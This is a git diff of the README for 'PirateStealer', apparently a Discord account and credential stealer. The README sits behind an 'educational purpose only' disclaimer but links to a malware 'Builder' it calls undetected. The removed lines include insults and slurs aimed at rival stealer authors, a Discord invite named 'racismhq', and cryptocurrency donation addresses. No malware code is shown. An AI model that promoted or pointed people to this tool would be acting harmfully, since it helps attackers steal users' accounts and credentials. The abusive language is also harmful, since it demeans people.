@@ -1,25 +1,11 @@
 #### ⚠️ Proof Of Concept && Educational Purpose Only ⚠️
 
 ## Table of Content
-- [Read This](https://github.com/bytixo/PirateStealer#read-this-please)
-- [Support Server](https://github.com/bytixo/PirateStealer#need-support-)
-- [Donate](https://github.com/bytixo/PirateStealer#donate)
-- [Login Showcase](https://github.com/bytixo/PirateStealer#login)
-- [Password Changed Showcase](https://github.com/bytixo/PirateStealer#changed-password)
-- [Key Features](https://github.com/bytixo/PirateStealer#features)
-- [Configuration](https://github.com/bytixo/PirateStealer#configuration)
+- [Read This](https://github.com/PirateStealer-GF)
+- [Support Server](https://github.com/PirateStealer-GF)
 
 ## Click here [Builder](https://github.com/bytixo/PirateStealer/releases/latest) (Undected as of now)
 
-## Skids hall 
-(changing embed colour and removing PirateStealer mention doesnt make your grabber selfcoded dumbass)
-- [PrimeFA](https://cdn.discordapp.com/attachments/902316110198767626/902427254674563092/partial.js) Thx Hideaki for deobfuscation. Spastic owner thinking that making an api gives him the rights to [sell](https://ibb.co/MfnzJC9) PirateStealer
-- Baba Stealer
-- RapidFA
-- Zerian
-- DemonFA
-- KingFA
-- and others lol
 # PirateStealer 
 
 
@@ -41,24 +27,8 @@ Check these repos:
 
 ![](https://media.discordapp.net/attachments/877960059781529710/878229324262699089/PirateMonster-removebg-preview_3.png)
 
-# Need support ?
-
-https://discord.gg/racismhq or https://discord.gg/rX52gkDQkp
-
 Discord: 0x7BTX
 
-# Donate 
-
-## Bytixoh (maintainer)
-
-Bitcoin: `bc1q5jj06v9fp5nzxp4tagc6m46r2jrcxmu4l69cvu`
-
-## Stanley (Original repository owner)
-Bitcoin: `bc1qpxqkyz62d6e6yrpjjp25q4pr3vjklx9mxn9fn4`
-
-Ethereum: `0x3841C8F8d9D7428fF95c8771e0bd22B7bd02dD6e`
-
-Doge: `D5yxhkGnMhFPauc9zeARtLdJNp4j7LB87U`
 
 
 ### Login
